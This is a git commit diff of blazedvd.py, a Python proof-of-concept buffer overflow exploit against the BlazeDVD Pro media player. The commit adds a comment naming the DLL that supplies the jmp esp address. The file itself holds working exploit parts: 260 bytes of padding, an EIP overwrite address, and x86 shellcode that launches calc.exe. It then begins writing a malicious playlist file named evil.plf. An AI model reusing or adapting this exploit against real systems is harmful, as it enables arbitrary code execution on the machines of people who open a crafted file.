c7acecb139a5cbccde6d62906b074bfc27ae8a34
KrypTiK <0xe011cfd0@gmail.com>
2013-07-24 02:53:32 -0400

    Update blazedvd.py

--- blazedvd.py
+++ blazedvd.py
@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 #More reliable BlazeDVDPro BoF
 junk = "\x41"*260
-eip = "\xcb\x25\x65\x61"
+eip = "\xcb\x25\x65\x61" # jmp esp C:\Program Files\BlazeVideo\BlazeDVD6 Professional\EPG.dll
 shellcode = "\x31\xC9\x51\x68\x63\x61\x6C\x63\x54\xB8\xC7\x93\xC2\x77\xFF\xD0" # Windows XP x86 calc.exe
 
 f = open('evil.plf','w')
